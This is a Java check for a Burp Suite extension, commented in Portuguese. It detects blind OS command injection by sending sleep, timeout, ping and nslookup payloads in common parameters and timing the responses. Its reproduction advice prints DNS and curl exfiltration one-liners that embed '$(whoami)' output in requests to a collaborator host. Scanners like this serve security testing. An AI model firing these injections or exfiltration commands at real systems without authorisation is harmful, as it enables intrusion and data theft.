package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

/**
 * OS Command Injection — detecção BLIND baseada em tempo: injeta comandos
 * de "dormir" (sleep/timeout) em sintaxes de shell Unix e Windows, e compara
 * o tempo de resposta contra um baseline (mesma requisição sem o payload).
 * Um atraso consistente próximo ao tempo pedido no payload é forte indício
 * de que o comando está sendo executado no servidor.
 *
 * Pra reduzir falso-positivo, o teste só confirma o achado se o atraso bater
 * de novo numa SEGUNDA tentativa (evita flagar lentidão de rede pontual).
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class OsCommandInjectionCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {"host", "ip", "domain", "cmd", "file", "name", "ping", "target"};
    private static final int SEGUNDOS_SLEEP = 6;

    private static final String[] PAYLOADS = {
            "; sleep " + SEGUNDOS_SLEEP,
            "| sleep " + SEGUNDOS_SLEEP,
            "`sleep " + SEGUNDOS_SLEEP + "`",
            "$(sleep " + SEGUNDOS_SLEEP + ")",
            "& timeout " + SEGUNDOS_SLEEP, // Windows cmd
            "| ping -n " + (SEGUNDOS_SLEEP + 1) + " 127.0.0.1", // Windows (ping como delay)
    };

    @Override
    public String nome() {
        return "OS Command Injection (blind, baseado em tempo)";
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        return executar(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> achados = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- Confirmação OOB via interactsh: comando que faz o servidor "ligar de volta" ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
            for (String param : new String[]{"host", "cmd", "ip"}) {
                try {
                    String host = ctx.interactsh().criarProbe(
                            "OS Command Injection confirmado via interação out-of-band no parâmetro '" + param + "'",
                            Severity.CRITICA,
                            base,
                            "O comando injetado no parâmetro '" + param + "' fez o servidor resolver/contatar um domínio único " +
                                    "de teste (via nslookup/curl embutido no payload) — confirmação inequívoca de execução de " +
                                    "comando no sistema operacional do servidor, sem depender de medição de tempo.",
                            "Nunca passe entrada do usuário para funções que executam comandos do SO. Use APIs nativas da " +
                                    "linguagem em vez de shell, e se for inevitável, use allowlist rígida + escaping adequado.",
                            "1) Reproduza com o payload exato: ; nslookup <host-gerado> (ou curl http://<host-gerado>/ em " +
                                    "ambientes com curl disponível). 2) Uma vez confirmada a execução, escale pra extração de " +
                                    "dados via DNS exfiltration: `; nslookup $(whoami).<host-gerado>` embute a saída do comando " +
                                    "no próprio subdomínio consultado. 3) RCE confirmado — prioridade máxima.");
                    if (host != null) {
                        // Payload de DNS lookup (funciona tanto em shells Unix quanto via nslookup no Windows)
                        String payloadUnix = "; nslookup " + host + " #";
                        String payloadWin = "& nslookup " + host + " & ";
                        for (String payload : new String[]{payloadUnix, payloadWin}) {
                            String url = base + "/?" + param + "=" + URLEncoder.encode(payload, "UTF-8");
                            api.http().sendRequest(HttpRequest.httpRequestFromUrl(url));
                        }
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de OS Command Injection (param " + param + "): " + e.getMessage());
                }
            }
        }

        // Baseline: tempo normal de resposta sem nenhum payload
        long tempoBaseline = medirTempo(api, base + "/");
        if (tempoBaseline < 0) return achados;

        for (String param : PARAM_NAMES) {
            for (String payload : PAYLOADS) {
                try {
                    String url = base + "/?" + param + "=" + URLEncoder.encode(payload, "UTF-8");
                    long tempo1 = medirTempo(api, url);
                    if (tempo1 < 0) continue;

                    long esperadoMs = SEGUNDOS_SLEEP * 1000L;
                    boolean pareceuAtrasado = (tempo1 - tempoBaseline) >= (esperadoMs - 1500);

                    if (pareceuAtrasado) {
                        // Confirma numa segunda tentativa pra reduzir falso-positivo por lentidão pontual de rede
                        long tempo2 = medirTempo(api, url);
                        boolean confirmado = tempo2 >= 0 && (tempo2 - tempoBaseline) >= (esperadoMs - 1500);

                        if (confirmado) {
                            achados.add(new Finding(
                                    "Possível OS Command Injection (blind) no parâmetro '" + param + "'",
                                    Severity.CRITICA,
                                    url,
                                    "O envio de um payload com comando de delay (" + SEGUNDOS_SLEEP + "s) causou um atraso consistente " +
                                            "na resposta em DUAS tentativas separadas, em comparação com o baseline sem payload. Isso é forte " +
                                            "indício de que o valor do parâmetro é executado como comando de sistema operacional no servidor.",
                                    "Payload: " + payload + " | Baseline: " + tempoBaseline + "ms | Tentativa 1: " + tempo1
                                            + "ms | Tentativa 2 (confirmação): " + tempo2 + "ms",
                                    "Nunca passe entrada do usuário para funções que executam comandos do SO (exec, system, popen...). " +
                                            "Use APIs nativas da linguagem em vez de shell, e se for inevitável, use allowlist rígida + escaping adequado.",
                                    "1) Como é blind (sem saída visível), confirme de novo manualmente no Repeater trocando o tempo de sleep " +
                                            "(ex: de " + SEGUNDOS_SLEEP + " para 15s) e veja se o atraso escala proporcionalmente — isso descarta coincidência de rede. " +
                                            "2) Para extrair dados sem canal de saída, use exfiltração via DNS/HTTP out-of-band: payload tipo " +
                                            "`; curl http://SEU-COLLABORATOR.burpcollaborator.net/$(whoami)` usando o Burp Collaborator pra " +
                                            "confirmar execução E capturar a saída do comando. 3) Isso é RCE completo — trate como achado de prioridade máxima."));
                            break; // confirmado nesse param, não testa os outros payloads
                        }
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro no check de OS Command Injection (param " + param + "): " + e.getMessage());
                }
            }
        }
        return achados;
    }

    private long medirTempo(MontoyaApi api, String url) {
        try {
            long inicio = System.currentTimeMillis();
            HttpRequest req = HttpRequest.httpRequestFromUrl(url);
            HttpResponse resp = api.http().sendRequest(req).response();
            if (resp == null) return -1;
            return System.currentTimeMillis() - inicio;
        } catch (Exception e) {
            return -1;
        }
    }
}
